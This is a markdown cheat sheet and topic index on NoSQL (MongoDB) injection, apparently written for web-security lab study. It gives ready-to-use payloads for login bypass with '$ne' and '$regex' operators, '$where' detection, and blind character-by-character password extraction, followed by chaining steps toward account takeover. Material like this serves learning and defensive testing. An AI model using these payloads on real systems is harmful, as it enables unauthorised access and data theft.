# NoSQL injection - topic overview & router

NoSQL injection targets MongoDB (and similar) queries where user input is embedded in query documents without sanitisation. Injecting JS operators (`$ne`, `$regex`, `$where`) or breaking string-based queries lets you bypass auth, enumerate hidden fields, and exfiltrate data character-by-character.

## 30-second quick reference

```
# Syntax detection (string context - JS evaluated)
'                          -> JS syntax error? Vulnerable.
Gifts'+'                   -> no error? String injection confirmed.
Gifts'&&0&&'x              -> false condition -> no results
Gifts'||1||'               -> always-true -> all records returned

# Operator injection (JSON body)
{"username":{"$ne":""},"password":{"$ne":""}}     -> bypass login (any user)
{"username":{"$regex":"admin.*"},"password":{"$ne":""}}  -> login as admin
{"$where":"0"}  vs  {"$where":"1"}               -> detect $where execution (different responses)

# Blind data extraction (string context)
administrator'&&this.password.length<30||'a'=='b  -> true/false on length
administrator'&&this.password[0]=='a||'a'=='b     -> char-by-char (Intruder cluster bomb)
```

## Decision map

| What you see | Sub-technique | Attack |
|---|---|---|
| Filter/search param, `'` causes syntax error | [Syntax-injection](Syntax-injection/) | boolean bypass, blind exfil |
| Login accepts JSON operators | [Operator-injection](Operator-injection/) | `$ne`/`$regex` auth bypass |
| Auth bypass works but can't read data | [Operator-injection](Operator-injection/) | `$where` field enum + value exfil |
| Error on `'`, `'+''` safe | [Syntax-injection](Syntax-injection/) | `||1||` to dump all records |

## Sub-technique folders
- `Syntax-injection/` - string-context injection; boolean blind extraction (2 labs)
- `Operator-injection/` - operator injection for auth bypass and field/value enumeration (2 labs)

## Root cause
MongoDB queries are constructed as BSON/JSON documents. When user input is interpolated into query strings (e.g., `db.collection.find({category: req.query.category})` evaluated as JS) or when JSON from the request body is used directly as operator values, attackers can inject operators and JS expressions the developer did not intend.

## Find it
- Any search/filter param: test `'` -> JS syntax error = string-context injection.
- Login endpoints: change username/password JSON values to `{"$ne":""}` -> different response = operator injection.
- Profile/lookup endpoints: test `'` and boolean payloads to confirm blind extraction.
- Look for `$where` support: add `"$where":"0"` vs `"$where":"1"` - different response = JS eval.

## Chaining
- Auth bypass -> admin session -> [Access-control](../Access-control/)
- Blind field enum -> discover password reset token field -> account takeover -> full compromise
- NoSQL injection + SSRF-style `$where` -> potential SSRF in some MongoDB configs

## Tools
- **Burp Repeater** - operator injection, boolean test
- **Burp Intruder (Cluster bomb)** - char-by-char blind extraction (pos1=0-N index, pos2=a-z chars)
- URL-encode payloads with Ctrl-U in Burp when injecting into query params

## References
- https://portswigger.net/web-security/nosql-injection
- https://portswigger.net/web-security/nosql-injection/nosql-databases
